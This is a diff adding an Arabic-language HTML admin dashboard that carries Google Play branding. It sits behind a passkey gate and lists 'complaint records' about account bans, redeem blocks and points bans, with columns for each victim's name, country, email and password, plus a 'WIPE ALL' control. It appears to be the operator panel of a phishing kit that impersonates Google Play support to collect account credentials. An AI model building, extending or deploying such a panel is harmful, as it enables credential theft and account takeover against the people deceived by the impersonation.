@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADMIN — Google Play</title>
+<link rel="stylesheet" href="css/admin.css">
+</head>
+<body>
+
+<!-- ═══════════════════════════
+     GATE  شاشة الدخول
+═══════════════════════════ -->
+<div id="gate">
+  <div class="gate-inner">
+
+    <div class="gate-eyebrow">◈ &nbsp; RESTRICTED ACCESS &nbsp; ◈</div>
+
+    <div class="gate-wordmark">ADMIN</div>
+    <div class="gate-sub">GOOGLE PLAY SUPPORT</div>
+
+    <div class="gate-sep"></div>
+
+    <input
+      id="gate-field"
+      class="gate-field"
+      type="password"
+      placeholder="PASSKEY"
+      autocomplete="off"
+      dir="ltr"
+    >
+
+    <button class="gate-submit" onclick="tryLogin()">C O N F I R M</button>
+
+    <div class="gate-err" id="gate-err"></div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════
+     DASHBOARD
+═══════════════════════════ -->
+<div id="dash">
+
+  <!-- BAR -->
+  <header class="bar">
+    <div class="bar-l">
+      <div class="pulse"></div>
+      <div class="g-logo" dir="ltr">
+        <span class="a">G</span><span class="b">o</span><span class="c">o</span><span class="d">g</span><span class="e">l</span><span class="f">e</span>
+      </div>
+      <span class="bar-id">PLAY &nbsp;·&nbsp; ADMIN PANEL</span>
+    </div>
+    <div class="bar-r">
+      <span class="rec-count" id="rec-count">0 REC</span>
+      <button class="btn-bar danger" onclick="wipeAll()">WIPE ALL</button>
+      <button class="btn-bar" onclick="lockOut()">LOCK</button>
+    </div>
+  </header>
+
+  <!-- STATS -->
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-n" id="st-total">0</div>
+      <div class="stat-l">TOTAL RECORDS</div>
+    </div>
+    <div class="stat accent">
+      <div class="stat-n" id="st-account">0</div>
+      <div class="stat-l">ACCOUNT BAN</div>
+    </div>
+    <div class="stat">
+      <div class="stat-n" id="st-redeem">0</div>
+      <div class="stat-l">REDEEM BLOCK</div>
+    </div>
+    <div class="stat">
+      <div class="stat-n" id="st-points">0</div>
+      <div class="stat-l">POINTS BAN</div>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main">
+
+    <div class="ctrl">
+      <span class="ctrl-label">COMPLAINT RECORDS</span>
+      <div class="srch">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
+        </svg>
+        <input type="text" placeholder="بحث..." oninput="search(this.value)">
+      </div>
+    </div>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>الاسم</th>
+            <th>الدولة</th>
+            <th>البريد الإلكتروني</th>
+            <th>كلمة المرور</th>
+            <th>المشكلة</th>
+            <th>التاريخ</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="tbody"></tbody>
+      </table>
+      <div class="empty" id="empty">NO RECORDS FOUND</div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <div class="foot">
+    <span>GOOGLE PLAY &nbsp;·&nbsp; SUPPORT ADMIN</span>
+    <span id="clock"></span>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script src="js/admin.js"></script>
+<script>
+  setInterval(() => {
+    const el = document.getElementById('clock');
+    if (el) el.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
+  }, 1000);
+</script>
+</body>
+</html>
